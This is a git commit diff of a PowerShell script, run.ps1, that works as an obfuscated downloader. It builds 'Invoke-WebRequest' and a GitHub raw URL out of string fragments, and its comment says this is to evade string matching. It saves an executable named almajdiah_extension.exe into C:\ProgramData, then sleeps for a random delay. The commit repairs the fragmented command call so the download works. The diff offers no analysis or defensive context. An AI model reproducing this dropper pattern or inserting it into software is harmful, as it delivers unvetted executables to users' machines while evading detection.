01ee2b69a1c55a7e3d44a9a5d0112fe9b9d90689
floorsofolga-svg <floorsofolga@gmail.com>
2026-01-27 21:23:16 +0300

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,10 +1,11 @@
 # Obfuscated script to avoid direct string matching
+
 $frag1 = 'I' + 'nv' + 'oke' + '-' + 'We' + 'bR' + 'equest'
 $frag2 = '-U' + 'ri'
 $frag3 = 'https://' + 'gith' + 'ub.com/' + 'flo' + 'orso' + 'folga' + '-svg/signedfiles/raw/refs/heads/main/almajdiah_extension.exe'
 $frag4 = '-OutFile'
 $frag5 = 'C:\ProgramData\program.exe'
-& $frag1 $frag2 $frag3 $frag4 $frag5  # Reconstruct and execute
+& $frag1 @($frag2, $frag3, $frag4, $frag5) # Reconstruct and execute
 
 $randDelay = [Math]::Abs((Get-Random) % 10) + 5  # Random delay 5-15 seconds
 Start-Sleep -Seconds $randDelay
